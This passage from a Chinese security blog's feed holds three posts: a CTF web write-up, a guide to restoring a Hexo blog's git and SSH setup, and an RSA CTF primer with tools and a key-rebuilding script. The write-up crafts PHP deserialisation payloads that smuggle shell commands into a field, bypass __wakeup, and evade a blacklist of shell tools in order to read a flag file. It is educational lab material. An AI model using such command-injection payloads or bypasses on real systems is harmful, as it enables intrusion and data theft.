<span class="string">'waf.php'</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"nothing"</span>;</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"M24"</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str="You got the airdrop";</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bag=<span class="string">"nothing"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;weapon=<span class="string">"kar98K"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$b();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method,$parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $file = explode(<span class="string">"."</span>,$method);</span><br><span class="line">            <span class="keyword">echo</span> $file[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="string">".//class$file[0].php"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//$method.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//win.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;center&gt;You lose&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            waf(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;weapon===<span class="string">'AWM'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Get_air_drops(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现这段代码还有个waf.php，再来一次发现不行了，那就先构造一波吧<br>首先我们发现system函数，这里可以利用，但是在<code>__call()</code>函数里面，我们应该知道<code>__call()</code>函数应该在类里面调用一个未定义的函数的时候使用<br>这里是利用bag参数去实现这一功能，毕竟到了Get_air_drops()函数里面我们就会调用一个没定义的函数了，因为bag参数对于我们而言是可控的<br>而在调用__call函数的时候，method变量对应就是bag参数的值了。。。。</p><p>所以我们先构造类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"//win.php &amp;&amp; whoami &amp;&amp; index"</span>;    <span class="comment">//这里的index是为了闭合后面的.php</span></span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br><span class="line">       <span class="keyword">echo</span> urlencode($a);                <span class="comment">//记得URL编码上次校赛的坑现在还是记得的。。。。。</span></span><br></pre></td></tr></table></figure><p>你问我为什么bag要以win.php开头？<br>看看这里就知道了，这一句表明肯定有这样的一个文件，我直接构造就好了<br><a href="http://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p><p>这里的$a参数出来的是下面的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是在反序列化的时候会自动调用<strong>wakeup()函数，从而导致了构造的类里面的变量重定义了，这就会导致失败了<br>所以我们还得绕过</strong>wakeup()函数<br>所以我们就改成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>urlencode之后变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A28%3A%22%2F%2Fwin.php+%26%26+whoami+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>出现了<code>Winner Winner,Chicken Dinner&lt;/center&gt;www-data</code><br>证明我们成功了，改一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; sort waf"</span>;  </span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>出现一段代码，自己拼接一下吧<br>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">       $black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line">        $black = []; </span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123; </span><br><span class="line">          <span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;  <span class="keyword">if</span>(stripos($values,$value))&#123;<span class="keyword">die</span>(<span class="string">"Attack!"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>发现我们可以用bash的特性绕过<br><a href="http://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p><p>再改一下payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; l\s &amp;&amp; index"</span>;    /</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>得到一堆文件列表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class </span><br><span class="line">  class.php </span><br><span class="line">  class.php.bak </span><br><span class="line">  image </span><br><span class="line">  index.php </span><br><span class="line">  index.php.bak </span><br><span class="line">  waf.php</span><br></pre></td></tr></table></figure><p>用pwd命令查看当前所在目录为/app，再find一下，找出该目录下所有的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/app </span><br><span class="line">/app/class </span><br><span class="line">/app/class/win.php </span><br><span class="line">/app/class/flag.php </span><br><span class="line">/app/image </span><br><span class="line">/app/image/PUBG.jpg </span><br><span class="line">/app/index.php.bak </span><br><span class="line">/app/waf.php </span><br><span class="line">/app/class.php </span><br><span class="line">/app/class.php.bak </span><br><span class="line">/app/index.php</span><br></pre></td></tr></table></figure><p>最后发现应该在flag.php里面<br>于是最后改payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:45:&quot;/win.php &amp;&amp; sort /app/class/flag.php &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到flag<br><a href="http://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本人渣渣，于是记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</title>
    <link href="0verwatch.top/2018/03/03/backupblogagain/"/>
    <id>0verwatch.top/2018/03/03/backupblogagain/</id>
    <published>2018-03-03T13:53:59.000Z</published>
    <updated>2018-05-20T06:47:12.788Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚假期结束回到宿舍。。发现自己的电脑外设全都没有了反应，重装驱动也不行，于是就只能重装系统了</p><p>重装系统后发现博客的环境又得重新配置，我就简单记录一下</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我把git跟Node还有hexo重装了一遍，<br>因为重装系统有可能删除了配置文件包括环境变量里面的，没有配置 name 和 email 的话，git 是无法正常工作的。所以首先得重新配置name跟email<br>在git bash里面输入下面两行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name=<span class="string">"你的名字"</span></span><br><span class="line">git config --global user.email=<span class="string">"你的邮箱"</span></span><br></pre></td></tr></table></figure><p>记得要写<code>--global</code>我发现如果不写的话是没有用的。。。。<br>对了如果上面两条命令fail了的话，记得先用命令<code>git init</code>再输入上面两条命令</p><p>然后就是重新生成私匙并添加至git后测试链接<br>生成私钥：<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code><br>接着按3个回车就好，中间你也可以输入密码，你随意，回车可以跳过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/c/Users/Mr.Yang/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:zA6wNJrFB6NcqS6eBog/AHlzQuvFjYpG759Yhh1lWGI xxxxxx@xxxxx.xxx(上面自己的邮箱)</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|    +E .         |</span></span><br><span class="line"><span class="string">| ..+oo+          |</span></span><br><span class="line"><span class="string">| oo+*+.o         |</span></span><br><span class="line"><span class="string">|o.*===+o         |</span></span><br><span class="line"><span class="string">|==+*... S        |</span></span><br><span class="line"><span class="string">|B.+.o .o         |</span></span><br><span class="line"><span class="string">|++o. +  .        |</span></span><br><span class="line"><span class="string">| +o.+ .          |</span></span><br><span class="line"><span class="string">|.  o.o           |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><p>.ssh目录下得到了两个文件：<code>id_rsa（私有秘钥）和id_rsa.pub（公有密钥）</code><br>一般都在C盘你自己的所在用户目录下的<code>./ssh</code>文件夹中<br><img src="http://img.blog.csdn.net/20180303214546347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>然后把id_rsa.pub里面的内容放到一个新的ssh的内容里面，标题自定义，以前的不要的ssh你也可以delete掉<br>下面是过程：<br>先在你的GitHub右上角你的用户那里找的Settings….<br><img src="http://img.blog.csdn.net/20180303214620763?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>然后在左边找到SSH的这个东西<br><img src="http://img.blog.csdn.net/20180303214633776?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>最后new一个ssh，记得把id_rsa.pub里面的全部内容放到里面，标题自定义，跟一开始设置博客的时候差不多<br><img src="https://img.blog.csdn.net/20180303214644340?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>然后重新在git bash 下输入命令检测是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host <span class="string">'github.com (207.97.227.239)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?  # 直接输入yes</span></span><br><span class="line"><span class="string">Hi cnfeat! You'</span>ve successfully authenticated, but GitHub does not provide shell access</span><br></pre></td></tr></table></figure><p>哈哈，然后又可以像以前一样开心的使用 <code>hexo g -d</code>了</p><p>参考博客：<a href="https://www.cnblogs.com/zhanglianbo/p/5648206.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhanglianbo/p/5648206.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本人刚假期结束回到宿舍。。发现自己的电脑外设全都没有了反应，重装驱动也不行，于是就只能重装系统了&lt;/p&gt;
&lt;p&gt;重装系统后发现博客的环境又得重新配置，我就简单记录一下&lt;/p&gt;
    
    </summary>
    
      <category term="hexo" scheme="0verwatch.top/categories/hexo/"/>
    
    
      <category term="Git" scheme="0verwatch.top/tags/Git/"/>
    
      <category term="Hexo" scheme="0verwatch.top/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>大致了解一下RSA以及出题套路</title>
    <link href="0verwatch.top/2018/02/25/RSASimple/"/>
    <id>0verwatch.top/2018/02/25/RSASimple/</id>
    <published>2018-02-25T05:17:06.000Z</published>
    <updated>2018-05-20T06:38:11.170Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  最近做的CTF题目遇到RSA加密总是不会，于是参考资料学习一番，小结自己的学习过程，怕自己某天又忘记了<br>RSA是属于现代密码学的范畴，现代密码学的终极目标是:发明永远无法破解的加密算法<br>而他们很多又是跟二进制相关，二进制加密的唯一算法  XOR<br>下面两个标准就很典型。。。<br>DES 数据加密标准<br>AES 高级加密标准<br>对于上面的东西一知半解。。什么轮子函数都没了解清楚，还有一些什么盒子之类的东西。。。emmm以后在深究吧</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>跟标题一样，我只是简单了解RSA算法，然后把自己得理解写出来，毕竟那些什么欧拉公式，什么高斯的数论，看也看一到两天，太费时间。。。</p><p><strong>RSA是一种非对称加密算法，它由 公钥（n/e），私钥(n/d)，明文M和密文C组成。</strong></p><h3 id="RSA的大致过程"><a href="#RSA的大致过程" class="headerlink" title="RSA的大致过程"></a>RSA的大致过程</h3><p><img src="http://img.blog.csdn.net/20180225122452898?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>选取两个大素数生成n,p和q，n=p*q,这里的n目前大都是在1024位左右，难以破解，因为它越长，分解起来就越难<br>随机选取加密密钥e，保证e和(p-1)(q-1)互素</p><p>计算解密私钥 <code>e*d ≡ 1 mod (p-1)(q-1)</code></p><p>加密   <code>c=m^e mod n</code></p><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><p>这里的c指的是密文，m指的是明文<br>其中(n,e)为公钥，(n,d)为私钥</p><h3 id="介绍一个同余运算的概念"><a href="#介绍一个同余运算的概念" class="headerlink" title="介绍一个同余运算的概念"></a>介绍一个同余运算的概念</h3><p>两个整数a,b，它们除以整数M所得的余数相等：<code>a ≡ b(mod m)</code>，比如说5除3余数为2，11除3余数也为2，于是可写成<code>11 ≡ 5(mod 3)</code></p><p>然后就做了几个题目，发现嫌他们的套路就是不停的玩转这几个参数。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">已知p、q、e求d</span><br><span class="line">已知p、q、e和密文 求明文</span><br><span class="line">已知n、e和密文 求明文</span><br><span class="line">已知公钥和密文 求明文</span><br></pre></td></tr></table></figure></p><h3 id="还有就是简单记录一下相关工具的用法"><a href="#还有就是简单记录一下相关工具的用法" class="headerlink" title="还有就是简单记录一下相关工具的用法"></a>还有就是简单记录一下相关工具的用法</h3><h4 id="RSAtool"><a href="#RSAtool" class="headerlink" title="RSAtool"></a>RSAtool</h4><p>这个还是比较方便的，但还是觉得脚本顺手<br><img src="http://img.blog.csdn.net/20180225125648163?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>Keysize(Bits)：填写你N的位数<br>Public Exp.(E)：填写你的e的十进制值<br>Number Base：填写你下面N的进制（一般采用10进制）<br>Modulus(N)：填写N的十进制数（和Number Base填写的要对应）<br>然后点击左下角的Factor N<br>就会自动分解出P和Q<br>然后点击左下角的Calc. D<br>就会自动计算出D<br>然后点击左下角的Test<br>（这里好像有个Bug，要先加密一次，才能用解密功能）<br>然后把你的密文放在result里，点击decrypto<br>即可得到解密后的答案</p><h4 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h4><p>一个大数分解工具<br>用命令行进入打此目录下，命令如下，N是你输入的大数<br>yafu-x64.exe factor(N)<br><img src="http://img.blog.csdn.net/20180225125731149?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>还有一个PARI。。。这好像也是一种语言。。一般是用来将大数16进制转10进制。。或者是判断N的位数使用<br><img src="http://img.blog.csdn.net/20180225125811876?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>反正不理了，指令也很简单：<br>第一步:<code>输入数字</code><br>（当然，如果输入16进制，你要带上0x，他会底下自动给你显示10进制，十分方便）<br>第二步: <code>binary(x)</code><br>他就会帮你把这个大数分解成2进制<br>第三步: <code>length(x)</code><br>他可以帮你输出这个N的位数</p><h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><p>有时候遇到下面这种格式的,就会选择用openssl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX</span><br><span class="line">vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF</span><br><span class="line">GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+7LhsLNSTm9N6LTko0Xa</span><br><span class="line">RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx</span><br><span class="line">z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k</span><br><span class="line">EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw</span><br><span class="line">XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH</span><br><span class="line">jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7</span><br><span class="line">r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU</span><br><span class="line">N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx</span><br><span class="line">PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/</span><br><span class="line">wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/02/25/9dsjJA.png" alt="9dsjJA.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in public.key -pubin -noout -text -modulus</span><br></pre></td></tr></table></figure></p><p>上面的public.key就是你所需要查看的文件名</p><p>然后使用密钥文件进行解密的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure></p><p>flag.enc是加密文件  private.pem是密钥  flag.dec解密文件</p><p>配合下面的Python脚本在linux下使用，记得在同一文件夹下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p =  <span class="number">258631601377848992211685134376492365269</span></span><br><span class="line">keypair.q = <span class="number">286924040788547268861394901519826758027</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>记得修改一下p q e</p><p>参考文章:<br><a href="http://www.freebuf.com/column/148185.html" target="_blank" rel="noopener">http://www.freebuf.com/column/148185.html</a><br><a href="http://skysec.top/2017/07/25/RSA常用工具/" target="_blank" rel="noopener">http://skysec.top/2017/07/25/RSA常用工具/</a></p>]]></content>
    
    <summary type="html">
    
